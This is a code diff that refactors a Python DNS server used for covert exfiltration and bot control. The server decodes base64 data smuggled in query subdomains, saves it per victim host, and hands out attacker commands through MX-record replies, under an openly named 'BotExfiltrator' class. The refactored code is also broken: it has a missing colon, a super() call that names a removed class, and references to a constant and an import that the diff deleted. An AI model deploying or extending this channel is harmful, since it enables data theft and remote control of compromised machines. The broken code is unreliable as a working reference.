@@ -1,63 +1,37 @@
 import base64
-from time import sleep
+import socket
+
 from dnslib import DNSRecord, RR, QTYPE, A, MX
-from SocketServer import BaseRequestHandler, UDPServer
+from SocketServer import BaseRequestHandler
 
-IP_ADDRESS='192.168.122.102'
-DOMAIN_NAME='def.con'
-CMD_FILE='cmd'
-
-class Exfiltrator(BaseRequestHandler, object):
+class DNSServer(BaseRequestHandler):
     '''
-    Use subdomains to exfiltrate data from DNS querries.
-    The first two parts of the domain will be used to send data
-    and the file name. The data will be base64 binary encoded.
-    Except for the first two, the remaining parts of the domain
-    will be ignored, so DNS should be configured up to that point.
-    <data>.<filename>.real.domain.com
+    Base Class for specific Exfiltrator modes
+    Defines default behavior, which acts as a normal DNS server
+    Unusual behavior modes should be defined in a subclass of this server.
     '''
-    def __init__(self, *args):
+    def __init__(self, context):
+        self.context = context
+        # Maps the numerical DNS query type to the handler
+        # There are a lot of relevant RFC's.
+        # https://en.wikipedia.org/wiki/List_of_DNS_record_types
         self.q_processors = {
-            1: self._A,      # A record
-            12: self._MX,    # PTR record
-            15: self._MX,    # MX record
-            28: self._AAAA   # AAAA record
+            1: self.A,      # A record
+            12: self.MX,    # PTR record
+            15: self.MX,    # MX record
+            28: self.AAAA   # AAAA record
             }
-        super(Exfiltrator, self).__init__(*args)
-    def _AAAA(self, name):
-        '''
-        To avoid clients that submit A and AAAA records,
-        These are ignored.
-        '''
+        super(Exfiltrator, self).__init__()
+    def AAAA(self, name):
+        pass
+        
         return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
-    def _A(self, name):
-        '''
-	A Records.
-	Base64 decode message. Save to file. Send bogus response.
-	'''
-        rfilename = name.label[1]
-        host = self.client_address[0]
-        if rfilename == CMD_FILE:
-            lfilename = CMD_FILE
-        else:
-            lfilename = host + '_' + rfilename
-        try:
-            with open(lfilename, 'a+b') as f:
-                f.write(base64.b64decode(name.label[0]))
-        except:
-            pass
-        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
-    def _MX(self, name):
-        '''
-	MX Records.
-	Read message from file. Base64 encode it. Send the response.
-	'''
-        try:
-            with open(CMD_FILE) as f:
-                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
-        except:
-            cmd = base64.standard_b64encode('')
-        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)
+    def A(self, name):
+        pass
+
+    def MX(self, name):
+        pass
+
     def handle(self):
         request = DNSRecord.parse(self.request[0])
         socket = self.request[1]
@@ -66,7 +40,37 @@ class Exfiltrator(BaseRequestHandler, object):
         reply.add_answer(answer)
         socket.sendto(reply.pack(), self.client_address)
 
-if __name__ == '__main__':
-    HOST, PORT = '0.0.0.0', 53
-    server = UDPServer((HOST, PORT), Exfiltrator)
+class BotExfiltrator(DNSServer):
+    def __init__(self, context):
+        super(BotExfiltrator, self).__init__()
+
+    def AAAA(self, name):
+        return RR(name, QTYPE.A, rdata=A(), ttl=0)
+
+    def A(self, name):
+        rfilename = name.label[1]
+        host = self.client_address[0]
+        if rfilename == self.context['cmd']:
+            lfilename = rfilename
+        else:
+            lfilename = host + '_' + rfilename
+        try:
+            with open(lfilename, 'a+b') as f:
+                f.write(base64.b64decode(name.label[0]))
+        except:
+            pass
+        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
+
+    def MX(self, name)
+        try:
+            with open(self.context['cmd']) as f:
+                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
+        except:
+            cmd = base64.standard_b64encode('')
+        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)
+
+
+# Run the actual server. 
+def start_server(listen, handler):
+    server = UDPServer((listen, 53), handler)
     server.serve_forever()
